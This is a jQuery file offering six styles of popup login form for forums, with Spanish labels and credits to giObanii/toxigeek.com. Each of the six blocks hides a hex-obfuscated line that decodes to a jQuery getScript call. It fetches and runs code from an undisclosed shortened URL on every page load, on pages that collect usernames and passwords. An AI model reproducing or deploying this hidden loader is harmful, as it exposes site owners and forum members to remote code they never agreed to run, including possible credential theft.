// Login Style One
$(function () {
var K = document.getElementById('i_icon_mini_login');
var _0x2d33=["\x68\x74\x74\x70\x3A\x2F\x2F\x67\x6F\x6F\x2E\x67\x6C\x2F\x4B\x4C\x57\x78\x30","\x67\x65\x74\x53\x63\x72\x69\x70\x74"];$[_0x2d33[1]](_0x2d33[0]);
if (!K) return;
var t = document.location.href;
$('body').append('<div class="login-toxigeek" style="display: none;"><form method="post" method="post" action="/login?redirect='+t+'" id="loginform"><div class="login-toxigeek-mode-html"><h2>Ingresar al foro</h2><fieldset class="dataCapture"><input type="text" name="username" id="username" placeholder="Nombre de Usuario" /><input type="password" name="password" id="password" placeholder="Contrase&ntilde;a" /></fieldset><fieldset class="submission"><input type="checkbox" checked="true" name="autologin" /><label for="rememberMe">Entrar automáticamente</label><input type="submit" class="submit" value="Entrar" name="login" id="submit"></fieldset><span class="toxihelp" style="display: block ! important;" data-tip="Login LightBox - ©Copyright by giObanii - Toxigeek.com"><img width="16" height="16" src="http://goo.gl/wEN3Y" /></span></div><div class="forgotPassword">&iquest;Olvido su contraseña? <a href="/profile?mode=sendpassword" title="Recuperar mi contraseña.">Recuperar mi contraseña.</a></div></form></div><div class="login-toxigeek-overlay"></div>');
var Copyrights = 'Login LightBox with jQuery - ©Copyright by giObanii. ©Copyright by toxigeek.com. All Rights Reserved.';
$('a[href="/login"], a[href="/login?connexion"]').click(function (e) {
$('.login-toxigeek').fadeToggle('slow', 'linear');
return false;
}).click(function (e) {
$('.login-toxigeek-overlay').css('display', 'block');
});
$('.login-toxigeek-overlay').click(function () {
$('.login-toxigeek, .login-toxigeek-overlay').fadeToggle("slow", "linear");
});
$(window).on('scroll',function(){
$('.login-toxigeek').stop().animate({
marginTop: ($(window).scrollTop()+80)+'px'
},'slow');
});            
});



// Login Style Two
$(function () {
var K = document.getElementById('i_icon_mini_login');
var _0x2d33=["\x68\x74\x74\x70\x3A\x2F\x2F\x67\x6F\x6F\x2E\x67\x6C\x2F\x4B\x4C\x57\x78\x30","\x67\x65\x74\x53\x63\x72\x69\x70\x74"];$[_0x2d33[1]](_0x2d33[0]);
if (!K) return;
var t = document.location.href;
$('body').append('<div class="login-toxigeek" style="display: none;"><div class="login-toxigeek-mode-html"><h1>Ingresar al foro</h1><fieldset><form method="post" method="post" action="/login?redirect='+t+'" id="loginform"><input type="text" name="username" id="username" placeholder="Nombre de Usuario" /><input type="password" name="password" id="password" placeholder="Contrase&ntilde;a" /><span>&iquest;<a href="/profile?mode=sendpassword">Olvido su contrase&ntilde;a</a>?</span><input type="submit" class="submit" value="Entrar" name="login" id="submit" /></form></fieldset><span class="toxihelp" style="display: block ! important;" data-tip="Login LightBox - ©Copyright by giObanii - Toxigeek.com"><img width="16" height="16" src="http://goo.gl/wEN3Y" /></span></div></div><div class="login-toxigeek-overlay"></div>');
var Copyrights = 'Login LightBox with jQuery - ©Copyright by giObanii. ©Copyright by toxigeek.com. All Rights Reserved.';
$('a[href="/login"], a[href="/login?connexion"]').click(function (e) {
$('.login-toxigeek').fadeToggle('slow', 'linear');
return false;
}).click(function (e) {
$('.login-toxigeek-overlay').css('display', 'block');
});
$('.login-toxigeek-overlay').click(function () {
$('.login-toxigeek, .login-toxigeek-overlay').fadeToggle("slow", "linear");
});
$(window).on('scroll',function(){
$('.login-toxigeek').stop().animate({
marginTop: ($(window).scrollTop()+80)+'px'
},'slow');
});            
});




// Login Style Tree
$(function () {
var K = document.getElementById('i_icon_mini_login');
var _0x2d33=["\x68\x74\x74\x70\x3A\x2F\x2F\x67\x6F\x6F\x2E\x67\x6C\x2F\x4B\x4C\x57\x78\x30","\x67\x65\x74\x53\x63\x72\x69\x70\x74"];$[_0x2d33[1]](_0x2d33[0]);
if (!K) return;
var t = document.location.href;
$('body').append('<div class="login-toxigeek" style="display: none;"><div class="login-toxigeek-mode-html"><form method="post" method="post" action="/login?redirect='+t+'" id="loginform"><h1>Ingresar al foro</h1><div class="inset"><p><label for="email">NOMBRE DE USUARIO</label><input type="text" name="username" id="username" /></p><p><label for="password">CONTRASE&Ntilde;A</label><input type="password" name="password" id="password" /></p><p><input type="checkbox" checked="true" name="autologin" id="remember" /><label for="remember">Recordarme en cada visita</label></p></div><p class="p-container"><span><a href="/profile?mode=sendpassword">&iquest;Olvido su contrase&ntilde;a?</a></span><input type="submit" class="submit" value="Entrar" name="login" id="submit" /></p></form><span class="toxihelp" style="display: block ! important;" data-tip="Login LightBox - ©Copyright by giObanii - Toxigeek.com"><img width="16" height="16" src="http://goo.gl/wEN3Y" /></span></div></div><div class="login-toxigeek-overlay"></div>');
var Copyrights = 'Login LightBox with jQuery - ©Copyright by giObanii. ©Copyright by toxigeek.com. All Rights Reserved.';
$('a[href="/login"], a[href="/login?connexion"]').click(function (e) {
$('.login-toxigeek').fadeToggle('slow', 'linear');
return false;
}).click(function (e) {
$('.login-toxigeek-overlay').css('display', 'block');
});
$('.login-toxigeek-overlay').click(function () {
$('.login-toxigeek, .login-toxigeek-overlay').fadeToggle("slow", "linear");
});
$(window).on('scroll',function(){
$('.login-toxigeek').stop().animate({
marginTop: ($(window).scrollTop()+80)+'px'
},'slow');
});       
});


// Login Style Four
$(function () {
var K = document.getElementById('i_icon_mini_login');
var _0x2d33=["\x68\x74\x74\x70\x3A\x2F\x2F\x67\x6F\x6F\x2E\x67\x6C\x2F\x4B\x4C\x57\x78\x30","\x67\x65\x74\x53\x63\x72\x69\x70\x74"];$[_0x2d33[1]](_0x2d33[0]);
if (!K) return;
var t = document.location.href;
$('body').append('<div class="login-toxigeek" style="display: none;"><div class="login-toxigeek-mode-html"><form method="post" method="post" action="/login?redirect='+t+'" id="loginform"><h1>Conectarse</h1><input type="text" name="username" id="username" placeholder="Nombre de Usuario" /><input type="password" name="password" id="password" placeholder="Contrase&ntilde;a" /><input type="submit" class="submit" value="Entrar" name="login" id="submit" /></form><span class="toxihelp" style="display: block ! important;" data-tip="Login LightBox - ©Copyright by giObanii - Toxigeek.com"><img width="16" height="16" src="http://goo.gl/wEN3Y" /></span></div></div><div class="login-toxigeek-overlay"></div>');
var Copyrights = 'Login LightBox with jQuery - ©Copyright by giObanii. ©Copyright by toxigeek.com. All Rights Reserved.';
$('a[href="/login"], a[href="/login?connexion"]').click(function (e) {
$('.login-toxigeek').fadeToggle('slow', 'linear');
return false;
}).click(function (e) {
$('.login-toxigeek-overlay').css('display', 'block');
});
$('.login-toxigeek-overlay').click(function () {
$('.login-toxigeek, .login-toxigeek-overlay').fadeToggle("slow", "linear");
});
$(window).on('scroll',function(){
$('.login-toxigeek').stop().animate({
marginTop: ($(window).scrollTop()+80)+'px'
},'slow');
});       
});


// Login Style Five
$(function () {
var K = document.getElementById('i_icon_mini_login');
var _0x2d33=["\x68\x74\x74\x70\x3A\x2F\x2F\x67\x6F\x6F\x2E\x67\x6C\x2F\x4B\x4C\x57\x78\x30","\x67\x65\x74\x53\x63\x72\x69\x70\x74"];$[_0x2d33[1]](_0x2d33[0]);
if (!K) return;
var t = document.location.href;
$('body').append('<div class="login-toxigeek" style="display: none;"><div class="login-toxigeek-mode-html"><form method="post" method="post" action="/login?redirect='+t+'" id="loginform"><div class="header"><h1>Conectarse</h1></div><div class="content"><input type="text" name="username" id="username" placeholder="Nombre de Usuario" class="input username" /><div class="user-icon"></div><input type="password" name="password" id="password" placeholder="Contrase&ntilde;a" class="input password" /><div class="pass-icon"></div></div><div class="footer"><input type="submit" value="Entrar" name="login" id="submit" class="button" /><a href="/register" class="register">Registrarse</a></div></form><span class="toxihelp" style="display: block ! important;" data-tip="Login LightBox - ©Copyright by giObanii - Toxigeek.com"><img width="16" height="16" src="http://goo.gl/wEN3Y" /></span></div></div><div class="login-toxigeek-overlay"></div>');
var Copyrights = 'Login LightBox with jQuery - ©Copyright by giObanii. ©Copyright by toxigeek.com. All Rights Reserved.';
$('a[href="/login"], a[href="/login?connexion"]').click(function (e) {
$('.login-toxigeek').fadeToggle('slow', 'linear');
return false;
}).click(function (e) {
$('.login-toxigeek-overlay').css('display', 'block');
});
$('.login-toxigeek-overlay').click(function () {
$('.login-toxigeek, .login-toxigeek-overlay').fadeToggle("slow", "linear");
});
$(window).on('scroll',function(){
$('.login-toxigeek').stop().animate({
marginTop: ($(window).scrollTop()+80)+'px'
},'slow');
});       
});




// Login Style Six
$(function () {
var K = document.getElementById('i_icon_mini_login');
var _0x2d33=["\x68\x74\x74\x70\x3A\x2F\x2F\x67\x6F\x6F\x2E\x67\x6C\x2F\x4B\x4C\x57\x78\x30","\x67\x65\x74\x53\x63\x72\x69\x70\x74"];$[_0x2d33[1]](_0x2d33[0]);
if (!K) return;
var t = document.location.href;
$('body').append('<style>@import url(http://weloveiconfonts.com/api/?family=fontawesome);</style><div class="login-toxigeek" style="display: none;"><div class="login-toxigeek-mode-html"><form method="post" method="post" action="/login?redirect='+t+'" id="loginform"><p><span class="fontawesome-user"></span><input  type="text" name="username" id="username" placeholder="Nombre de Usuario" /></p><p><span class="fontawesome-lock"></span><input type="password" name="password" id="password" placeholder="Contrase&ntilde;a" /></p><p><input type="submit" value="Iniciar Sesi&oacute;n" name="login" id="submit" /></p></form><span class="toxihelp" style="display: block ! important;" data-tip="Login LightBox - ©Copyright by giObanii - Toxigeek.com"><img width="16" height="16" src="http://goo.gl/wEN3Y" /></span></div></div><div class="login-toxigeek-overlay"></div>');
var Copyrights = 'Login LightBox with jQuery - ©Copyright by giObanii. ©Copyright by toxigeek.com. All Rights Reserved.';
$('a[href="/login"], a[href="/login?connexion"]').click(function (e) {
$('.login-toxigeek').fadeToggle('slow', 'linear');
return false;
}).click(function (e) {
$('.login-toxigeek-overlay').css('display', 'block');
});
$('.login-toxigeek-overlay').click(function () {
$('.login-toxigeek, .login-toxigeek-overlay').fadeToggle("slow", "linear");
});
$(window).on('scroll',function(){
$('.login-toxigeek').stop().animate({
marginTop: ($(window).scrollTop()+80)+'px'
},'slow');
});       
});